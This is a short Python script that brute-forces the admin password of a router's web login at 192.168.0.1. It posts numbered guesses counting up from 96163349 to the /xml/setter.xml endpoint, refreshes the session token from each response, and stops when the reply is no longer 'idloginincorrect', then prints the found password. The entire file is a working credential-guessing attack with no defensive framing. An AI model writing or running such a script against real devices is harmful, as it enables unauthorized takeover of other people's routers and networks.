import os
import sys
import time
import requests 


# Last 10 seconds
try:
    #response = requests.get('http://192.168.0.1/common_page/login.html')
   # print("STATUS_CODE:"+str(response.status_code))
    s = requests.Session()
    #response = s.get('http://192.168.0.1/common_page/login.html')
    #print("LOADING PAGE STATUS_CODE:"+str(response.status_code))
    
    
    
    session=['sessionToken=00000000']
    mydata={'token':session[0].replace("sessionToken=",""),'fun':'15','Username':'NULL','Password':'XXXX'}
    myheader = {'Accept':'text/plain, */*; q=0.01','Content-Type':'application/x-www-form-urlencoded','Accept-Language':'en-US,en;q=0.5','User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; rv:70.0) Gecko/20100101 Firefox/70.0','Referer': 'http://192.168.0.1/common_page/login.html','X-Rquested-With': 'XMLHttpRequest','Origin':'http://192.168.0.1','Cookie':session[0]}
    response = s.post('http://192.168.0.1/xml/setter.xml', headers = myheader, data=mydata)


    passwordtest=96163349
    while True:
        
        session = response.headers['Set-Cookie'].split(";")
        print("Session-token:"+session[0])  
        
        #putin = input("Waiting for Input:")
        myheader = {'Accept':'text/plain, */*; q=0.01','Content-Type':'application/x-www-form-urlencoded','Accept-Language':'en-US,en;q=0.5','User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; rv:70.0) Gecko/20100101 Firefox/70.0','Referer': 'http://192.168.0.1/common_page/login.html','X-Rquested-With': 'XMLHttpRequest','Origin':'http://192.168.0.1','Cookie':session[0]}
        mydata={'token':session[0].replace("sessionToken=",""),'fun':'15','Username':'admin','Password':str(passwordtest)}
        
        print("TESTING:"+str(passwordtest))
        response = s.post('http://192.168.0.1/xml/setter.xml', headers = myheader, data=mydata)
        
        print("STATUS_CODE:"+str(response.status_code))
        
        passwordresponse = response.content.decode()
        print("Content:"+passwordresponse)
        
        if(passwordresponse != "idloginincorrect"):
            break

        passwordtest = passwordtest +1
        
    print("PASSWORD is:"+str(passwordtest))
    while True:
        pass
except Exception as e:
    print(e)
while True:
    pass